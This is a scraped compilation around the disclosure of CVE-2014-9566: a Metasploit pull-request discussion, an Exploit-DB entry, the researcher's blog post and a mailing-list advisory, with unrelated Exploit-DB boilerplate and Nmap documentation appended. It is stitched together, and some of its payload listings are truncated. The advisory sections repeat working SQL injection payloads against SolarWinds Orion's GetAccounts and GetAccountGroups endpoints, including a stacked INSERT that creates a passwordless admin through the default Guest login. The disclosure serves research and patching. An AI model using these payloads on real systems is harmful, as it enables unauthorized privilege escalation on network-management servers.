### @brandonprry **[brandonprry](/brandonprry)** commented [Feb 24, 2015](#issue-58764285)

This pull request adds support for exploiting an authenticated stacked SQL injection within the core Orion service of many Solarwinds products, specifically:

Network Performance Monitor -- < 11.5

NetFlow Traffic Analyzer -- < 4.1

Network Configuration Manager -- < 7.3.2

IP Address Manager -- < 4.3

User Device Tracker -- < 3.2

VoIP & Network Quality Manager -- < 4.2

Server & Application Monitor -- < 6.2

Web Performance Monitor -- < 2.2

Any user can be used to exploit this, including the default Guest account (which has no password by default, and is the default user in the module). IIRC Tod should have a vulnerable trial.

This vulnerability was reported to Solarwinds on Dec 8th, 2014 and was assigned the CVE identifier [CVE-2014-9566](https://github.com/advisories/GHSA-9cx9-3r2j-m5xx "CVE-2014-9566"). A coordinated disclosure date of Feb 24th, 2015 was chosen by both parties.

[@brandonprry](https://github.com/brandonprry) Can you provide some clarity here. The login function takes the username and password from datastore and authenticate. By default that is Guest with blank password. However, when the injection is done, you call login(username,'') which will call the method with the injected username and blank password however the login will still use the previous username (guest) and password in the datastore which won't prove anything.

On line 90, I inserted the statement:

```
datastore['username'] = username

just for demonstration and I got the response:

The module fail to login with the newly created account but in the current state it will still display success since it is using the datastore username and password.

Sorry, something went wrong.

Should be more like

```
def login (username = datastore['USERNAME'], password = datastore['PASSWORD'])

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'Orion', 'Login.aspx')
    })

    cookie = res.get_cookies

Great catch, fixing now. Originally, the login code lived in run, and was moved out. Missed updating this part.

# SolarWinds Orion Service - SQL Injection

#### EDB-ID:

###### 36262

###### [2014-9566](https://nvd.nist.gov/vuln/detail/CVE-2014-9566)

**Vulnerable App:**

```
I found a couple SQL injection vulnerabilities in the core Orion service
used in most of the Solarwinds products (SAM, IPAM, NPM, NCM, etc…). This
service provides a consistent configuration and authentication layer across
the products.

To be exact, the vulnerable applications and versions are:

Network Performance Monitor -- < 11.5
NetFlow Traffic Analyzer -- < 4.1
Network Configuration Manager -- < 7.3.2
IP Address Manager -- < 4.3
User Device Tracker -- < 3.2
VoIP & Network Quality Manager -- < 4.2
Server & Application Monitor -- < 6.2
Web Performance Monitor -- < 2.2

At first glance, the injections are only available to admins, as the
requests used are on the Manage Accounts page. However, it seems there is
no real ACL check on the GetAccounts and GetAccountGroups endpoints of the
AccountManagement.asmx service, which means that even authenticating as
Guest allows for exploitation. By default, the Guest account has no
password and is enabled.

On both the GetAccounts and GetAccountGroups endpoints, the 'sort' and
'dir' parameters are susceptible to boolean-/time-based, and stacked
injections. By capturing the AJAX requests made by an admin user to these
endpoints, authenticating as Guest and replacing the admin cookie with the
Guest cookie, you can still make a successful request, and thus a
successful exploitation vector for any authenticated user.

Being a stacked injection, this becomes a privilege escalation at the very
least, as an attacker is able to insert their own admin user. A pull
request for a Metasploit module which should achieve this on any product
using the Orion service as the core authentication management system, using
the GetAccounts endpoint, has been made (
https://github.com/rapid7/metasploit-framework/pull/4836). By default, the
module attempts to authenticate as the Guest user with a blank password,
then exploit the SQL injection to insert a new admin with a blank password.

I am not sure if the non-trial versions allow you to specify your own SQL
server, but the trials install a SQL Server Express instance. The SQL user
that the application uses is not an administrator, and the xp_cmd_shell
stored procedure is unavailable.

Within the GetAccounts endpoint:

Parameter: dir (GET)

    Type: boolean-based blind
    Title: Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause
    Payload: sort=Accounts.AccountID&dir=ASC,(SELECT (CASE WHEN (5791=5791)
THEN CHAR(65)+CHAR(83)+CHAR(67) ELSE 5791*(SELECT 5791 FROM
master..sysdatabases) END))

    Type: stacked queries

    Type: AND/OR time-based blind

Parameter: sort (GET)

    Type: boolean-based blind
    Title: Microsoft SQL Server/Sybase boolean-based blind - Parameter

    Payload: sort=(SELECT (CASE WHEN (8998=8998) THEN

    Type: stacked queries

    Type: AND/OR time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind
    Payload: sort=Accounts.AccountID WAITFOR DELAY '0:0:5'--&dir=ASC

Within the GetAccountGroups endpoint, very similar injection techniques are
available:

Parameter: dir (GET)

    Type: boolean-based blind
    Title: Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause
    Payload: sort=Accounts.GroupPriority&dir=ASC,(SELECT (CASE WHEN
(8799=8799) THEN CHAR(65)+CHAR(83)+CHAR(67) ELSE 8799*(SELECT 8799 FROM
master..sysdatabases) END))

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries
    Payload: sort=Accounts.GroupPriority&dir=ASC; WAITFOR DELAY '0:0:5'--

    Type: AND/OR time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind
    Payload: sort=Accounts.GroupPriority&dir=ASC WAITFOR DELAY '0:0:5'--

Parameter: sort (GET)

    Type: boolean-based blind
    Title: Microsoft SQL Server/Sybase boolean-based blind - Parameter
replace (original value)
    Payload: sort=(SELECT (CASE WHEN (1817=1817) THEN
CHAR(65)+CHAR(99)+CHAR(99)+CHAR(111)+CHAR(117)+CHAR(110)+CHAR(116)+CHAR(115)+CHAR(46)+CHAR(71)+CHAR(114)+CHAR(111)+CHAR(117)+CHAR(112)+CHAR(80)+CHAR(114)+CHAR(105)+CHAR(111)+CHAR(114)+CHAR(105)+CHAR(116)+CHAR(121)
ELSE 1817*(SELECT 1817 FROM master..sysdatabases) END))&dir=ASC

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries
    Payload: sort=Accounts.GroupPriority; WAITFOR DELAY '0:0:5'--&dir=ASC

    Type: AND/OR time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind
    Payload: sort=Accounts.GroupPriority WAITFOR DELAY '0:0:5'--&dir=ASC

An example injection to insert an admin user named notadmin with a blank
password using the 'dir' parameter would be:

ASC;insert into accounts values ('notadmin', '127-510823478-74417-8',
'/+PA4Zck3arkLA7iwWIugnAEoq4ocRsYjF7lzgQWvJc+pepPz2a5z/L1Pz3c366Y/CasJIa7enKFDPJCWNiKRg==',
'Feb  1 2100 12:00AM', 'Y', 'notadmin', 1, '', '', 1, -1, 8, -1, 4, 0, 0,
0, 0, 0, 0, 'Y', 'Y', 'Y', 'Y', 'Y', '', '', 0, 0, 0, 'N', 'Y', '', 1, '',
0, '');

This vulnerability was reported to Solarwinds on Dec 8th, 2014 and was
assigned the CVE identifier CVE-2014-9566. A coordinated disclosure date of
Feb 24th, 2015 was chosen by both parties. I would like to thank Rob Hock,
Group Product Manager – Network Management at Solarwinds for the easy
coordination (you should still have a bug bounty though!).

i can has crazy cool vuln name, yaes? wat about Polarbends, or Molarfriends?

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

### [Authenticated Stacked SQL injection in core Solarwinds Orion service (CVE-2014-9566)](http://volatile-minds.blogspot.com/2015/02/authenticated-stacked-sql-injection-in.html)

Been a while since I wrote a post, so let's fix that.

I found a couple SQL injection vulnerabilities in the core Orion service used in most of the Solarwinds products (SAM, IPAM, NPM, NCM, etc…). This service provides a consistent configuration and authentication layer across the products.

To be exact, the vulnerable applications and versions are:

Network Performance Monitor -- < 11.5

NetFlow Traffic Analyzer -- < 4.1

Network Configuration Manager -- < 7.3.2

IP Address Manager -- < 4.3

User Device Tracker -- < 3.2

VoIP & Network Quality Manager -- < 4.2

Server & Application Monitor -- < 6.2

Web Performance Monitor -- < 2.2

At first glance, the injections are only available to admins, as the requests used are on the Manage Accounts page. However, it seems there is no real ACL check on the GetAccounts and GetAccountGroups endpoints of the AccountManagement.asmx service, which means that even authenticating as Guest allows for exploitation. By default, the Guest account has no password and is enabled.

On both the GetAccounts and GetAccountGroups endpoints, the 'sort' and 'dir' parameters are susceptible to boolean-/time-based, and stacked injections. By capturing the AJAX requests made by an admin user to these endpoints, authenticating as Guest and replacing the admin cookie with the Guest cookie, you can still make a successful request, and thus a successful exploitation vector for any authenticated user.

Being a stacked injection, this becomes a privilege escalation at the very least, as an attacker is able to insert their own admin user. A pull request for a Metasploit module which should achieve this on any product using the Orion service as the core authentication management system, using the GetAccounts endpoint, will be made. By default, the module attempts to authenticate as the Guest user with a blank password, then exploit the SQL injection to insert a new admin with a blank password.

I am not sure if the non-trial versions allow you to specify your own SQL server, but the trials install a SQL Server Express instance. The SQL user that the application uses is not an administrator, and the xp\_cmd\_shell stored procedure is unavailable.

Within the GetAccounts endpoint:

Parameter: dir (GET)

    Type: boolean-based blind

    Title: Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause

    Payload: sort=Accounts.AccountID&dir=ASC,(SELECT (CASE WHEN (5791=5791) THEN CHAR(65)+CHAR(83)+CHAR(67) ELSE 5791\*(SELECT 5791 FROM master..sysdatabases) END))

    Type: stacked queries

    Title: Microsoft SQL Server/Sybase stacked queries

    Payload: sort=Accounts.AccountID&dir=ASC; WAITFOR DELAY '0:0:5'--

    Type: AND/OR time-based blind

    Title: Microsoft SQL Server/Sybase time-based blind

    Payload: sort=Accounts.AccountID&dir=ASC WAITFOR DELAY '0:0:5'--

Parameter: sort (GET)

    Type: boolean-based blind

    Title: Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)

    Payload: sort=(SELECT (CASE WHEN (8998=8998) THEN CHAR(65)+CHAR(99)+CHAR(99)+CHAR(111)+CHAR(117)+CHAR(110)+CHAR(116)+CHAR(115)+CHAR(46)+CHAR(65)+CHAR(99)+CHAR(99)+CHAR(111)+CHAR(117)+CHAR(110)+CHAR(116)+CHAR(73)+CHAR(68) ELSE 8998\*(SELECT 8998 FROM master..sysdatabases) END))&dir=ASC

    Type: stacked queries

    Title: Microsoft SQL Server/Sybase stacked queries

    Payload: sort=Accounts.AccountID; WAITFOR DELAY '0:0:5'--&dir=ASC

    Type: AND/OR time-based blind

    Title: Microsoft SQL Server/Sybase time-based blind

    Payload: sort=Accounts.AccountID WAITFOR DELAY '0:0:5'--&dir=ASC

Within the GetAccountGroups endpoint, very similar injection techniques are available:

Parameter: dir (GET)

    Type: boolean-based blind

    Title: Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause

    Payload: sort=Accounts.GroupPriority&dir=ASC,(SELECT (CASE WHEN (8799=8799) THEN CHAR(65)+CHAR(83)+CHAR(67) ELSE 8799\*(SELECT 8799 FROM master..sysdatabases) END))

    Type: stacked queries

    Title: Microsoft SQL Server/Sybase stacked queries

    Payload: sort=Accounts.GroupPriority&dir=ASC; WAITFOR DELAY '0:0:5'--

    Type: AND/OR time-based blind

    Title: Microsoft SQL Server/Sybase time-based blind

    Payload: sort=Accounts.GroupPriority&dir=ASC WAITFOR DELAY '0:0:5'--

Parameter: sort (GET)

    Type: boolean-based blind

    Title: Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)

    Payload: sort=(SELECT (CASE WHEN (1817=1817) THEN CHAR(65)+CHAR(99)+CHAR(99)+CHAR(111)+CHAR(117)+CHAR(110)+CHAR(116)+CHAR(115)+CHAR(46)+CHAR(71)+CHAR(114)+CHAR(111)+CHAR(117)+CHAR(112)+CHAR(80)+CHAR(114)+CHAR(105)+CHAR(111)+CHAR(114)+CHAR(105)+CHAR(116)+CHAR(121) ELSE 1817\*(SELECT 1817 FROM master..sysdatabases) END))&dir=ASC

    Type: stacked queries

    Title: Microsoft SQL Server/Sybase stacked queries

    Payload: sort=Accounts.GroupPriority; WAITFOR DELAY '0:0:5'--&dir=ASC

    Type: AND/OR time-based blind

    Title: Microsoft SQL Server/Sybase time-based blind

    Payload: sort=Accounts.GroupPriority WAITFOR DELAY '0:0:5'--&dir=ASC

An example injection to insert an admin user named notadmin with a blank password using the 'dir' parameter would be:

ASC;insert into accounts values ('notadmin', '127-510823478-74417-8', '/+PA4Zck3arkLA7iwWIugnAEoq4ocRsYjF7lzgQWvJc+pepPz2a5z/L1Pz3c366Y/CasJIa7enKFDPJCWNiKRg==', 'Feb  1 2100 12:00AM', 'Y', 'notadmin', 1, '', '', 1, -1, 8, -1, 4, 0, 0, 0, 0, 0, 0, 'Y', 'Y', 'Y', 'Y', 'Y', '', '', 0, 0, 0, 'N', 'Y', '', 1, '', 0, '');

This vulnerability was reported to Solarwinds on Dec 8th, 2014 and was assigned the CVE identifier CVE-2014-9566. A coordinated disclosure date of Feb 24th, 2015 was chosen by both parties. I would like to thank Rob Hock, Group Product Manager – Network Management at Solarwinds for the easy coordination (you should still have a bug bounty though!).

I am a geek who spends his free time messing around with Linux and security stuffs, programming, and anything that mixes with the two. I also enjoy playing around with mathematics (mainly physics and statistics). Word play is always an onomatopoeia.

# Multiple SQL injections in core Orion service affecting many Solarwinds products (CVE-2014-9566)

---

*From*: Brandon Perry <bperry.volatile () gmail com>

*Date*: Mon, 2 Mar 2015 06:08:43 -0600

```
I found a couple SQL injection vulnerabilities in the core Orion service
used in most of the Solarwinds products (SAM, IPAM, NPM, NCM, etc…). This
service provides a consistent configuration and authentication layer across
the products.

To be exact, the vulnerable applications and versions are:

Network Performance Monitor -- < 11.5
NetFlow Traffic Analyzer -- < 4.1
Network Configuration Manager -- < 7.3.2
IP Address Manager -- < 4.3
User Device Tracker -- < 3.2
VoIP & Network Quality Manager -- < 4.2
Server & Application Monitor -- < 6.2
Web Performance Monitor -- < 2.2

At first glance, the injections are only available to admins, as the
requests used are on the Manage Accounts page. However, it seems there is
no real ACL check on the GetAccounts and GetAccountGroups endpoints of the
AccountManagement.asmx service, which means that even authenticating as
Guest allows for exploitation. By default, the Guest account has no
password and is enabled.

On both the GetAccounts and GetAccountGroups endpoints, the 'sort' and
'dir' parameters are susceptible to boolean-/time-based, and stacked
injections. By capturing the AJAX requests made by an admin user to these
endpoints, authenticating as Guest and replacing the admin cookie with the
Guest cookie, you can still make a successful request, and thus a
successful exploitation vector for any authenticated user.

Being a stacked injection, this becomes a privilege escalation at the very
least, as an attacker is able to insert their own admin user. A pull
request for a Metasploit module which should achieve this on any product
using the Orion service as the core authentication management system, using
the GetAccounts endpoint, has been made (
<https://github.com/rapid7/metasploit-framework/pull/4836>). By default, the
module attempts to authenticate as the Guest user with a blank password,
then exploit the SQL injection to insert a new admin with a blank password.

I am not sure if the non-trial versions allow you to specify your own SQL
server, but the trials install a SQL Server Express instance. The SQL user
that the application uses is not an administrator, and the xp_cmd_shell
stored procedure is unavailable.

Within the GetAccounts endpoint:

Parameter: dir (GET)

    Type: boolean-based blind
    Title: Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause
    Payload: sort=Accounts.AccountID&dir=ASC,(SELECT (CASE WHEN (5791=5791)
THEN CHAR(65)+CHAR(83)+CHAR(67) ELSE 5791*(SELECT 5791 FROM
master..sysdatabases) END))

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries
    Payload: sort=Accounts.AccountID&dir=ASC; WAITFOR DELAY '0:0:5'--

    Type: AND/OR time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind
    Payload: sort=Accounts.AccountID&dir=ASC WAITFOR DELAY '0:0:5'--

Parameter: sort (GET)

    Type: boolean-based blind
    Title: Microsoft SQL Server/Sybase boolean-based blind - Parameter
replace (original value)
    Payload: sort=(SELECT (CASE WHEN (8998=8998) THEN
CHAR(65)+CHAR(99)+CHAR(99)+CHAR(111)+CHAR(117)+CHAR(110)+CHAR(116)+CHAR(115)+CHAR(46)+CHAR(65)+CHAR(99)+CHAR(99)+CHAR(111)+CHAR(117)+CHAR(110)+CHAR(116)+CHAR(73)+CHAR(68)
ELSE 8998*(SELECT 8998 FROM master..sysdatabases) END))&dir=ASC

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries
    Payload: sort=Accounts.AccountID; WAITFOR DELAY '0:0:5'--&dir=ASC

    Type: AND/OR time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind
    Payload: sort=Accounts.AccountID WAITFOR DELAY '0:0:5'--&dir=ASC

Within the GetAccountGroups endpoint, very similar injection techniques are
available:

Parameter: dir (GET)

    Type: boolean-based blind
    Title: Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause
    Payload: sort=Accounts.GroupPriority&dir=ASC,(SELECT (CASE WHEN
(8799=8799) THEN CHAR(65)+CHAR(83)+CHAR(67) ELSE 8799*(SELECT 8799 FROM
master..sysdatabases) END))

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries
    Payload: sort=Accounts.GroupPriority&dir=ASC; WAITFOR DELAY '0:0:5'--

    Type: AND/OR time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind
    Payload: sort=Accounts.GroupPriority&dir=ASC WAITFOR DELAY '0:0:5'--

Parameter: sort (GET)

    Type: boolean-based blind
    Title: Microsoft SQL Server/Sybase boolean-based blind - Parameter
replace (original value)
    Payload: sort=(SELECT (CASE WHEN (1817=1817) THEN
CHAR(65)+CHAR(99)+CHAR(99)+CHAR(111)+CHAR(117)+CHAR(110)+CHAR(116)+CHAR(115)+CHAR(46)+CHAR(71)+CHAR(114)+CHAR(111)+CHAR(117)+CHAR(112)+CHAR(80)+CHAR(114)+CHAR(105)+CHAR(111)+CHAR(114)+CHAR(105)+CHAR(116)+CHAR(121)
ELSE 1817*(SELECT 1817 FROM master..sysdatabases) END))&dir=ASC

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries
    Payload: sort=Accounts.GroupPriority; WAITFOR DELAY '0:0:5'--&dir=ASC

    Type: AND/OR time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind
    Payload: sort=Accounts.GroupPriority WAITFOR DELAY '0:0:5'--&dir=ASC

An example injection to insert an admin user named notadmin with a blank
password using the 'dir' parameter would be:

ASC;insert into accounts values ('notadmin', '127-510823478-74417-8',
'/+PA4Zck3arkLA7iwWIugnAEoq4ocRsYjF7lzgQWvJc+pepPz2a5z/L1Pz3c366Y/CasJIa7enKFDPJCWNiKRg==',
'Feb  1 2100 12:00AM', 'Y', 'notadmin', 1, '', '', 1, -1, 8, -1, 4, 0, 0,
0, 0, 0, 0, 'Y', 'Y', 'Y', 'Y', 'Y', '', '', 0, 0, 0, 'N', 'Y', '', 1, '',
0, '');

This vulnerability was reported to Solarwinds on Dec 8th, 2014 and was
assigned the CVE identifier CVE-2014-9566. A coordinated disclosure date of
Feb 24th, 2015 was chosen by both parties. I would like to thank Rob Hock,
Group Product Manager – Network Management at Solarwinds for the easy
coordination (you should still have a bug bounty though!).

i can has crazy cool vuln name, yaes? wat about Polarbends, or Molarfriends?

i dub thee Molarfriends vulnerability. wheres my markketing tem...

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

## Name

nmap — Network exploration tool and security / port scanner

## Synopsis

`nmap` [
*`<Scan Type>`*

*`<Options>`*
] {
*`<target specification>`*
}

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

```
# nmap -A -T4 scanme.nmap.org
